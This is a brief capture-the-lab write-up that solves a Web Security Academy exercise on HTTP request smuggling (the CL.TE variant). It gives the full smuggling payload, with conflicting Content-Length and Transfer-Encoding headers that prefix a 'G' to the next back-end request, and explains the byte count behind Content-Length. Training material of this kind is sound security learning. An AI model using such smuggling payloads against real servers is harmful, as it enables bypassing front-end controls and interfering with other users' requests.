# HTTP request smuggling, basic CL.TE vulnerability
# Objective
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. \
The front-end server rejects requests that aren't using the GET or POST method.\
To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

# Solution
Payload:
```
POST / HTTP/1.1
Host: 0a5700f504b0a82a838c425c00b800fe.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The `Content-Length: 6` number:
```
0\r\n       +3
\r\n        +2
G           +1
```
